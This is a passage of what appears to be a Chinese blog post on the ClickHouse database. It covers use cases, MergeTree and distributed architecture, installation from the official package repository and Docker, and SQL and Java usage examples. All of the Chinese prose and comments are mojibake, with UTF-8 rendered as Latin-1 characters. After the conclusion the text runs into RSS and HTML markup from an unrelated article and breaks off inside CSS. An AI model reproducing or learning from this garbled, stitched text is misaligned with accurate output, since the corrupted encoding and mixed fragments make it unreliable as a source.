<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d2a6450b9df4691a7b166aab0e10a34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226760&amp;x-signature=PDFyxuLy%2FyRAy8K0ei8Ir4pcltc%3D" alt="" loading="lazy"/></p>
<p>â€‹</p>
<h2 data-id="heading-23">5.4 å¤§æ•°æ®å®æ—¶å¤„ç†</h2>
<p>ä¸Flinkã€Sparkç­‰æµå¤„ç†æ¡†æ¶é›†æˆï¼ŒClickHouseå¯ä½œä¸ºå®æ—¶æ•°æ®å¤„ç†çš„ç»ˆç«¯å­˜å‚¨å’Œåˆ†æèŠ‚ç‚¹ã€‚æµå¤„ç†æ¡†æ¶å®Œæˆæ•°æ®æ¸…æ´—ã€è½¬æ¢åï¼Œå°†æ•°æ®å®æ—¶å†™å…¥ClickHouseï¼Œæ”¯æ’‘å®æ—¶é£æ§ã€åŠ¨æ€å®šä»·ã€å®æ—¶æ¨èç­‰æ ¸å¿ƒä¸šåŠ¡åœºæ™¯ï¼Œå®ç°â€œæ•°æ®äº§ç”Ÿ-å¤„ç†-åˆ†æ-å†³ç­–â€çš„å…¨é“¾è·¯å®æ—¶åŒ–ã€‚</p>
<h2 data-id="heading-24">5.5 ç‰©è”ç½‘ï¼ˆIoTï¼‰æ•°æ®åˆ†æ</h2>
<p>ç‰©è”ç½‘è®¾å¤‡äº§ç”Ÿçš„æ—¶åºæ•°æ®ï¼ˆå¦‚æ¸©åº¦ã€æ¹¿åº¦ã€è®¾å¤‡çŠ¶æ€ï¼‰å…·æœ‰â€œæµ·é‡ã€å®æ—¶â€çš„ç‰¹ç‚¹ï¼ŒClickHouseå¯é«˜æ•ˆå­˜å‚¨å’Œåˆ†æè¿™äº›æ•°æ®ï¼Œç»Ÿè®¡è®¾å¤‡å¼‚å¸¸äº‹ä»¶ã€å¥åº·åº¦ã€èƒ½è€—è¶‹åŠ¿ç­‰æŒ‡æ ‡ï¼Œæ”¯æ’‘æ™ºèƒ½è®¾å¤‡è¿ç»´ã€èƒ½è€—ç®¡ç†ç­‰ä¸šåŠ¡åœºæ™¯ã€‚</p>
<h2 data-id="heading-25">5.6 æœºå™¨å­¦ä¹ ä¸ç”Ÿæˆå¼AIæ”¯æ’‘</h2>
<p>éšç€AIæŠ€æœ¯çš„å‘å±•ï¼ŒClickHouseä¹Ÿæˆä¸ºML&amp;GenAIåœºæ™¯çš„é‡è¦æ”¯æ’‘å·¥å…·ã€‚å…¶é«˜æ€§èƒ½çš„å‘é‡æœç´¢ã€å³æ—¶èšåˆèƒ½åŠ›å¯åŠ é€Ÿæ¨¡å‹è®­ç»ƒæ•°æ®çš„å¤„ç†ï¼›Anthropicåœ¨Claude 4çš„ç ”å‘å’Œéƒ¨ç½²ä¸­ï¼Œå°±å€ŸåŠ©ClickHouseå®ç°äº†é«˜æ•ˆçš„æ•°æ®å¤„ç†ï¼Œå¯è§å…¶åœ¨AIé¢†åŸŸçš„ä»·å€¼ã€‚</p>
<p>â€</p>
<p>â€</p>
<h2 data-id="heading-26">å…­ã€æ ¸å¿ƒæ¦‚å¿µæ¶æ„åŠåŸç†</h2>
<h2 data-id="heading-27">6.1 æ¶æ„</h2>
<h3 data-id="heading-28">1.Â <strong>åˆ—å¼å­˜å‚¨</strong></h3>
<p>æ•°æ®æŒ‰åˆ—ç‹¬ç«‹å­˜å‚¨ï¼ŒæŸ¥è¯¢æ—¶åªè¯»å–éœ€è¦çš„åˆ—ï¼Œå¤§å¹…å‡å°‘I/Oå¼€é”€ã€‚æ ¸å¿ƒå®ç°åŸºäº<code>IColumn</code>â€‹æ¥å£ï¼Œç¡®ä¿ç±»å‹å®‰å…¨å’Œå‘é‡åŒ–æ“ä½œã€‚</p>
<h3 data-id="heading-29">2.Â <strong>MergeTreeå¼•æ“</strong></h3>
<p>ClickHouseæœ€æ ¸å¿ƒçš„å­˜å‚¨å¼•æ“ï¼Œç‰¹ç‚¹åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>æ•°æ®åˆ†åŒº</strong>ï¼šæŒ‰æ—¶é—´æˆ–å…¶ä»–ç»´åº¦åˆ†åŒºï¼ˆPartitionï¼‰</li>
<li><strong>ç¨€ç–ç´¢å¼•</strong>ï¼šåªå­˜å‚¨éƒ¨åˆ†æ•°æ®ç´¢å¼•ï¼ŒèŠ‚çœç©ºé—´</li>
<li><strong>åå°åˆå¹¶</strong>ï¼šè‡ªåŠ¨åˆå¹¶å°æ•°æ®å—ï¼ˆPartsï¼‰ä¼˜åŒ–å­˜å‚¨</li>
<li><strong>æ’åºé”®</strong>ï¼šæ•°æ®æŒ‰ORDER BYå­—æ®µç‰©ç†æ’åºï¼ŒåŠ é€ŸæŸ¥è¯¢</li>
</ul>
<h3 data-id="heading-30">3.Â <strong>åˆ†å¸ƒå¼æ¶æ„</strong></h3>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Distributedè¡¨   â”‚
â”‚  (é€»è¾‘è§†å›¾)      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">          â”‚
    â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”
    â”‚  åˆ†ç‰‡1    â”‚  åˆ†ç‰‡2    â”‚  åˆ†ç‰‡3
    â”‚  å‰¯æœ¬1-1  â”‚  å‰¯æœ¬2-1  â”‚  å‰¯æœ¬3-1
    â”‚  å‰¯æœ¬1-2  â”‚  å‰¯æœ¬2-2  â”‚  å‰¯æœ¬3-2
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€
</span></code></pre>
<ul>
<li><strong>åˆ†ç‰‡</strong>ï¼šæ•°æ®æ°´å¹³æ‹†åˆ†</li>
<li><strong>å¤åˆ¶</strong>ï¼šé€šè¿‡ZooKeeperå®ç°å¤šå‰¯æœ¬åŒæ­¥</li>
</ul>
<h3 data-id="heading-31">4.Â <strong>ç‰©åŒ–è§†å›¾ï¼ˆMaterialized Viewï¼‰</strong></h3>
<p>é¢„è®¡ç®—å¹¶å­˜å‚¨å¤æ‚æŸ¥è¯¢ç»“æœï¼Œæ˜¾è‘—æå‡æŸ¥è¯¢æ€§èƒ½ã€‚</p>
<p>â€</p>
<h2 data-id="heading-32">6.2 å·¥ä½œåŸç†</h2>
<p>ClickHouseçš„æ¶æ„è®¾è®¡ä½“ç°äº†ç°ä»£åˆ†æå‹æ•°æ®åº“çš„ç²¾é«“ã€‚å…¶æ•´ä½“æ¶æ„å¯åˆ†ä¸ºä¸‰å±‚ï¼šæŸ¥è¯¢å¤„ç†å±‚ã€å­˜å‚¨å±‚ä»¥åŠé›†æˆå±‚ã€‚</p>
<p>æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªè®¿é—®å±‚ï¼Œé€šè¿‡ä¸åŒåè®®ç®¡ç†ç”¨æˆ·ä¼šè¯å¹¶ä¸åº”ç”¨ç¨‹åºé€šä¿¡ã€‚ç³»ç»Ÿè¿˜åŒ…å«ç”¨äºçº¿ç¨‹ã€ç¼“å­˜ã€åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ã€å¤‡ä»½ä»¥åŠæŒç»­ç›‘æ§çš„æ­£äº¤ç»„ä»¶ã€‚</p>
<p><strong>å­˜å‚¨å±‚</strong>æ˜¯ClickHouseæ¶æ„çš„æ ¸å¿ƒï¼Œä¸»è¦ç”±MergeTreeç³»åˆ—è¡¨å¼•æ“ç»„æˆã€‚è¿™äº›è¡¨å¼•æ“åŸºäºLSMæ ‘çš„æ€æƒ³ï¼Œå°†è¡¨æ‹†åˆ†ä¸ºæŒ‰æ°´å¹³æ–¹å‘åˆ’åˆ†ä¸”æœ‰åºçš„â€œpartsâ€ï¼Œè¿™äº›partsä¼šç”±åå°è¿›ç¨‹æŒç»­åˆå¹¶ã€‚</p>
<p>æ¯ä¸ªMergeTreeè¡¨åœ¨åˆå¹¶å…¶è¾“å…¥partsçš„è¡Œæ–¹å¼ä¸Šæœ‰æ‰€ä¸åŒï¼Œä¾‹å¦‚å¯ä»¥å¯¹è¡Œè¿›è¡Œèšåˆï¼Œæˆ–åœ¨è¿‡æœŸæ—¶è¿›è¡Œæ›¿æ¢ã€‚é™¤äº†MergeTreeç³»åˆ—ï¼Œè¿˜æœ‰ç”¨äºåŠ é€Ÿæˆ–åˆ†å¸ƒæŸ¥è¯¢æ‰§è¡Œçš„ä¸“ç”¨è¡¨å¼•æ“ï¼Œä»¥åŠç”¨äºä¸å¤–éƒ¨ç³»ç»Ÿè¿›è¡ŒåŒå‘æ•°æ®äº¤æ¢çš„è™šæ‹Ÿè¡¨å¼•æ“ã€‚</p>
<p><strong>åˆ†å¸ƒå¼èƒ½åŠ›</strong>æ˜¯ClickHouseçš„å¦ä¸€å¤§ç‰¹è‰²ã€‚å®ƒæ”¯æŒåœ¨å¤šä¸ªé›†ç¾¤èŠ‚ç‚¹ä¹‹é—´å¯¹è¡¨è¿›è¡Œåˆ†ç‰‡å’Œå¤åˆ¶ï¼Œä»¥å®ç°å¯æ‰©å±•æ€§å’Œé«˜å¯ç”¨æ€§ã€‚åˆ†ç‰‡çš„ä¸»è¦ç›®çš„æ˜¯å¤„ç†è¶…å‡ºå•ä¸ªèŠ‚ç‚¹å®¹é‡çš„æ•°æ®é›†ï¼Œæˆ–è€…å°†æŸå¼ è¡¨çš„è¯»å†™è´Ÿè½½åˆ†æ•£åˆ°å¤šä¸ªèŠ‚ç‚¹ä¸Šã€‚</p>
<p>ClickHouseå¯ä»¥åœ¨å¤šç§æ¨¡å¼ä¸‹è¿è¡Œï¼šæœ¬åœ°éƒ¨ç½²æ¨¡å¼ã€äº‘ç«¯æ¨¡å¼ã€ç‹¬ç«‹æ¨¡å¼æˆ–è¿›ç¨‹å†…æ¨¡å¼ã€‚è¿™ç§çµæ´»æ€§ä½¿å¾—å®ƒèƒ½å¤Ÿé€‚åº”ä¸åŒçš„éƒ¨ç½²ç¯å¢ƒå’Œåº”ç”¨éœ€æ±‚ã€‚</p>
<p>â€</p>
<p>â€</p>
<h2 data-id="heading-33">ä¸ƒã€ä¸‹è½½å®‰è£…</h2>
<h2 data-id="heading-34">ç³»ç»Ÿè¦æ±‚</h2>
<ul>
<li>Linuxï¼ˆæ¨èUbuntuã€CentOSï¼‰</li>
<li>4GBä»¥ä¸Šå†…å­˜</li>
<li>x86-64æˆ–ARM64æ¶æ„</li>
</ul>
<h2 data-id="heading-35">å®‰è£…æ–¹å¼ï¼ˆLinuxï¼‰</h2>
<p><strong>æ–¹å¼ä¸€ï¼šRPMåŒ…å®‰è£…</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ·»åŠ å®˜æ–¹ä»“åº“</span>
sudo yum install -y yum-utils
sudo yum-config-manager --add-repo https://packages.clickhouse.com/rpm/clickhouse.repo

<span class="hljs-comment"># å®‰è£…</span>
sudo yum install -y clickhouse-server clickhouse-client

<span class="hljs-comment"># å¯åŠ¨æœåŠ¡</span>
sudo systemctl start clickhouse-server
sudo systemctl <span class="hljs-built_in">enable</span> clickhouse-server
</code></pre>
<p><strong>æ–¹å¼äºŒï¼šDockeréƒ¨ç½²</strong>ï¼ˆæ¨èï¼‰</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‹‰å–å®˜æ–¹é•œåƒ</span>
docker pull clickhouse/clickhouse-server

<span class="hljs-comment"># å¯åŠ¨å®¹å™¨</span>
docker run -d \
  --name clickhouse-server \
  -p 8123:8123 -p 9000:9000 \
  --<span class="hljs-built_in">ulimit</span> nofile=262144:262144 \
  clickhouse/clickhouse-server
</code></pre>
<p><strong>æ–¹å¼ä¸‰ï¼šTgzåŒ…æ‰‹åŠ¨å®‰è£…</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½</span>
curl -O https://packages.clickhouse.com/tgz/stable/clickhouse-common-static-24.3.2.23-amd64.tgz

<span class="hljs-comment"># è§£å‹å¹¶å®‰è£…</span>
tar -xzvf clickhouse-*.tgz
sudo ./clickhouse-*/install/doinst.sh
</code></pre>
<h2 data-id="heading-36">éªŒè¯å®‰è£…</h2>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># ä½¿ç”¨å®¢æˆ·ç«¯è¿æ¥</span>
clickhouse-client --password

<span class="hljs-meta"># æŸ¥çœ‹ç‰ˆæœ¬</span>
<span class="hljs-function">SELECT <span class="hljs-title">version</span>()</span>;
</code></pre>
<p>â€</p>
<p>â€</p>
<h2 data-id="heading-37">å…«ã€ä½¿ç”¨å®ä¾‹</h2>
<h2 data-id="heading-38">å®ä¾‹1ï¼šåˆ›å»ºæ•°æ®åº“å’Œè¡¨</h2>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºæ•°æ®åº“</span>
<span class="hljs-keyword">CREATE</span> DATABASE IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> analytics;

<span class="hljs-comment">-- åˆ›å»ºMergeTreeè¡¨</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> analytics.user_log (
    user_id UInt32,
    event_date <span class="hljs-type">Date</span>,
    action String,
    duration UInt32,
    region String
) ENGINE <span class="hljs-operator">=</span> MergeTree()
<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> toYYYYMM(event_date)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (event_date, user_id, action)
SETTINGS index_granularity <span class="hljs-operator">=</span> <span class="hljs-number">8192</span>;

<span class="hljs-comment">-- åˆ›å»ºåˆ†å¸ƒå¼è¡¨ï¼ˆé›†ç¾¤ç¯å¢ƒï¼‰</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> analytics.user_log_all <span class="hljs-keyword">AS</span> user_log
ENGINE <span class="hljs-operator">=</span> Distributed(<span class="hljs-keyword">default</span>, analytics, user_log, rand());
</code></pre>
<p>â€</p>
<h2 data-id="heading-39">å®ä¾‹2ï¼šæ•°æ®å¯¼å…¥</h2>
<pre><code class="hljs language-sql" lang="sql"># ä»CSVæ–‡ä»¶å¯¼å…¥
clickhouse<span class="hljs-operator">-</span>client <span class="hljs-comment">--query="INSERT INTO analytics.user_log FORMAT CSVWithNames" &lt; user_log.csv</span>

# JSONæ ¼å¼æ’å…¥
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> analytics.user_log FORMAT JSONEachRow
{"user_id":<span class="hljs-number">1001</span>, "event_date":"2025-12-15", "action":"login", "duration":<span class="hljs-number">120</span>, "region":"BJ"}
{"user_id":<span class="hljs-number">1002</span>, "event_date":"2025-12-15", "action":"purchase", "duration":<span class="hljs-number">300</span>, "region":"SH"}

# æ‰¹é‡æ’å…¥ï¼ˆæ¨èï¼‰
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> analytics.user_log <span class="hljs-keyword">VALUES</span>
(<span class="hljs-number">1003</span>, <span class="hljs-string">'2025-12-15'</span>, <span class="hljs-string">'browse'</span>, <span class="hljs-number">60</span>, <span class="hljs-string">'GZ'</span>),
(<span class="hljs-number">1004</span>, <span class="hljs-string">'2025-12-15'</span>, <span class="hljs-string">'search'</span>, <span class="hljs-number">45</span>, <span class="hljs-string">'SZ'</span>),
(<span class="hljs-number">1005</span>, <span class="hljs-string">'2025-12-15'</span>, <span class="hljs-string">'login'</span>, <span class="hljs-number">100</span>, <span class="hljs-string">'BJ'</span>);
</code></pre>
<p>â€</p>
<h2 data-id="heading-40">å®ä¾‹3ï¼šåŸºæœ¬æŸ¥è¯¢</h2>
<pre><code class="hljs language-vbnet" lang="vbnet">-- æŸ¥è¯¢æœ€è¿‘<span class="hljs-number">7</span>å¤©æ´»è·ƒç”¨æˆ·
<span class="hljs-keyword">SELECT</span> 
    event_date,
    countDistinct(user_id) <span class="hljs-keyword">as</span> active_users
<span class="hljs-keyword">FROM</span> analytics.user_log
<span class="hljs-keyword">WHERE</span> event_date &gt;= today() - <span class="hljs-number">7</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> event_date
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> event_date;

-- åˆ†æç”¨æˆ·è¡Œä¸ºè·¯å¾„
<span class="hljs-keyword">SELECT</span> 
    action,
    count() <span class="hljs-keyword">as</span> action_count,
    avg(duration) <span class="hljs-keyword">as</span> avg_duration
<span class="hljs-keyword">FROM</span> analytics.user_log
<span class="hljs-keyword">WHERE</span> event_date = <span class="hljs-comment">'2025-12-15'</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> action
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> action_count DESC
LIMIT <span class="hljs-number">10</span>;

-- ä½¿ç”¨ç‰©åŒ–è§†å›¾åŠ é€ŸæŸ¥è¯¢
CREATE MATERIALIZED VIEW analytics.user_daily_stats
ENGINE = SummingMergeTree()
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (event_date, region)
<span class="hljs-keyword">AS</span> <span class="hljs-keyword">SELECT</span>
    event_date,
    region,
    count() <span class="hljs-keyword">as</span> total_events,
    sum(duration) <span class="hljs-keyword">as</span> total_duration
<span class="hljs-keyword">FROM</span> analytics.user_log
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> event_date, region;

-- æŸ¥è¯¢ç‰©åŒ–è§†å›¾
<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> analytics.user_daily_stats
<span class="hljs-keyword">WHERE</span> event_date = <span class="hljs-comment">'2025-12-15';</span>
</code></pre>
<p>â€</p>
<h2 data-id="heading-41">å®ä¾‹4ï¼šJavaåº”ç”¨é›†æˆ</h2>
<pre><code class="hljs language-ini" lang="ini">// ä½¿ç”¨JDBCè¿æ¥æ± 
String <span class="hljs-attr">jdbcUrl</span> = <span class="hljs-string">"jdbc:clickhouse://localhost:8123/analytics"</span><span class="hljs-comment">;</span>
ClickHouseDataSource <span class="hljs-attr">dataSource</span> = new ClickHouseDataSource(jdbcUrl)<span class="hljs-comment">;</span>

// æ‰¹é‡æ’å…¥ä¼˜åŒ–
try (Connection <span class="hljs-attr">conn</span> = dataSource.getConnection()) {
    PreparedStatement <span class="hljs-attr">stmt</span> = conn.prepareStatement(
        "INSERT INTO user_log SELECT * FROM input('user_id UInt32, event_date Date, action String, duration UInt32, region String')"
    )<span class="hljs-comment">;</span>
  
    // è®¾ç½®æ‰¹é‡æ•°æ®
    stmt.setObject(1, new ClickHouseWriter() {
        @Override
        public void write(ClickHouseOutputStream stream) throws IOException {
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 10000; i++) {</span>
                // å†™å…¥äºŒè¿›åˆ¶æ•°æ®ï¼ˆRowBinaryæ ¼å¼ï¼‰
                stream.writeInt32(i)<span class="hljs-comment">;</span>
                stream.writeDate(LocalDate.now())<span class="hljs-comment">;</span>
                stream.writeString("action" + i)<span class="hljs-comment">;</span>
                stream.writeInt32(100 + i % 1000)<span class="hljs-comment">;</span>
                stream.writeString("Region" + i % 10)<span class="hljs-comment">;</span>
            }
        }
    })<span class="hljs-comment">;</span>
  
    stmt.executeUpdate()<span class="hljs-comment">;</span>
}
</code></pre>
<p>â€</p>
<h2 data-id="heading-42">å®ä¾‹5ï¼šæ€§èƒ½åˆ†æ</h2>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŸ¥çœ‹è¡¨å¤§å°å’Œå‹ç¼©ç‡</span>
<span class="hljs-keyword">SELECT</span> 
    <span class="hljs-keyword">table</span>,
    formatReadableSize(<span class="hljs-built_in">sum</span>(data_compressed_bytes)) <span class="hljs-keyword">AS</span> compressed,
    formatReadableSize(<span class="hljs-built_in">sum</span>(data_uncompressed_bytes)) <span class="hljs-keyword">AS</span> uncompressed,
    round(<span class="hljs-built_in">sum</span>(data_compressed_bytes) <span class="hljs-operator">/</span> <span class="hljs-built_in">sum</span>(data_uncompressed_bytes), <span class="hljs-number">2</span>) <span class="hljs-keyword">AS</span> ratio
<span class="hljs-keyword">FROM</span> system.columns
<span class="hljs-keyword">WHERE</span> database <span class="hljs-operator">=</span> <span class="hljs-string">'analytics'</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">table</span>;

<span class="hljs-comment">-- æŸ¥çœ‹æŸ¥è¯¢æ€§èƒ½</span>
<span class="hljs-keyword">SELECT</span> 
    query,
    query_duration_ms,
    read_rows,
    memory_usage
<span class="hljs-keyword">FROM</span> system.query_log
<span class="hljs-keyword">WHERE</span> event_time <span class="hljs-operator">&gt;=</span> now() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">1</span> <span class="hljs-keyword">HOUR</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> query_duration_ms <span class="hljs-keyword">DESC</span>
LIMIT <span class="hljs-number">10</span>;
</code></pre>
<p>â€</p>
<h2 data-id="heading-43">ç»“æŸè¯­</h2>
<p>ClickHouseä½œä¸ºä¸€æ¬¾ä¸“ä¸ºOLAPè€Œç”Ÿçš„åˆ—å¼æ•°æ®åº“ï¼Œå‡­å€Ÿå…¶æè‡´çš„æ€§èƒ½å’Œçµæ´»çš„æ¶æ„ï¼Œå·²ç»æˆä¸ºæ•°æ®åˆ†æé¢†åŸŸçš„é‡è¦åŸºçŸ³ã€‚æ— è®ºæ˜¯å®æ—¶æŠ¥è¡¨ã€ç”¨æˆ·è¡Œä¸ºåˆ†æè¿˜æ˜¯æ—¥å¿—ç›‘æ§ï¼ŒClickHouseéƒ½èƒ½æä¾›äºšç§’çº§çš„æŸ¥è¯¢å“åº”ã€‚</p>
<p>å¦‚æœä½ æƒ³æ·±å…¥äº†è§£æ›´å¤šæ•°æ®åº“æŠ€æœ¯ã€å¤§æ•°æ®æ¶æ„å’Œæ€§èƒ½ä¼˜åŒ–çš„å®æˆ˜ç»éªŒï¼Œæ¬¢è¿å…³æ³¨æˆ‘ä»¬çš„å…¬ä¼—å·Â  <strong>"æŠ€æµ·æ‹¾è´"</strong> Â ï¼Œåœ¨é‚£é‡Œæˆ‘ä»¬å°†æŒç»­åˆ†äº«ï¼š</p>
<ul>
<li>ClickHouseç”Ÿäº§ç¯å¢ƒè°ƒä¼˜å®æˆ˜</li>
<li>åˆ†å¸ƒå¼æ•°æ®åº“æ¶æ„è®¾è®¡</li>
<li>å¤§æ•°æ®æŠ€æœ¯æ ˆæ·±åº¦è§£æ</li>
<li>ä¸€çº¿å¤§å‚æŠ€æœ¯å®è·µæ¡ˆä¾‹</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¢ç´¢å…³äºSpec å’ŒSkills çš„ä¸€äº›å®æˆ˜è¿ç”¨-Kiroç¯‡]]></title>    <link>https://juejin.cn/post/7603958579181092864</link>    <guid>https://juejin.cn/post/7603958579181092864</guid>    <pubDate>2026-02-09T07:18:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603958579181092864" data-draft-id="7603958579181043712" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¢ç´¢å…³äºSpec å’ŒSkills çš„ä¸€äº›å®æˆ˜è¿ç”¨-Kiroç¯‡"/> <meta itemprop="keywords" content="å‰ç«¯,ä»£ç è§„èŒƒ,AIGC"/> <meta itemprop="datePublished" content="2026-02-09T07:18:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç–æœˆæ™´ç©º"/> <meta itemprop="url" content="https://juejin.cn/user/4089838985022968"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ¢ç´¢å…³äºSpec å’ŒSkills çš„ä¸€äº›å®æˆ˜è¿ç”¨-Kiroç¯‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4089838985022968/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç–æœˆæ™´ç©º
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:18:06.000Z" title="Mon Feb 09 2026 07:18:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»21åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol 